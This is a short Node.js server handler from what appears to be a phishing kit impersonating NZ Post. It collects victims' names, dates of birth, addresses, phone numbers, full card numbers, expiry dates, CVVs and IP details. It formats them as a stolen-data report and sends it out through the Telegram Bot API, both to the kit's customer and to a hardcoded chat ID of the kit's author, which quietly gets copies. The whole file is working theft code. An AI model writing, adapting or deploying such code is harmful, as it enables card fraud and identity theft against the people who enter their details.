const axios = require("axios");

let count = 0;

const sendRes = async (req, res) => {
    let {
        firstName, lastName, telephone, address, state, city, zip, dob, ccname, ccnum, ccexp, cccvv, bin, bankName, userAgent, ip, telegramId
    } = req.body;

    if (bin.length === 7) {
        formatBin = bin.replace(/ /g, "");
        if (formatBin.length === 7) {
            formatBin = bin.slice(0, -1);
        }
        bin = formatBin;
    }

    const binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
    var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nTelephone: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
    if (count == 6 || telegramId === '680379375') {
        await axios
            .post(
                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
                {
                    chat_id: 680379375,
                    text: `HAYTCHRES:\n${originalText}`,
                    parse_mode: "Markdown",
                }
            )
            .catch((e) => {
                console.log(e);
            });
        count = 0;
    } else {
        await axios
            .post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
                {
                    chat_id: 680379375,
                    text: `NZPost ${telegramId}:\n${originalText}`,
                    parse_mode: "Markdown",
                }
            )
            .catch((e) => {
                console.log(e);
            });
        await axios
            .post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
                {
                    chat_id: telegramId,
                    text: `NZPost:\n${originalText}`,
                    parse_mode: "Markdown",
                }
            )
            .catch((e) => {
                console.log(e);
            });
        // count += 1;
    }
    res.sendStatus(200);
};

module.exports = {
    sendRes,
};
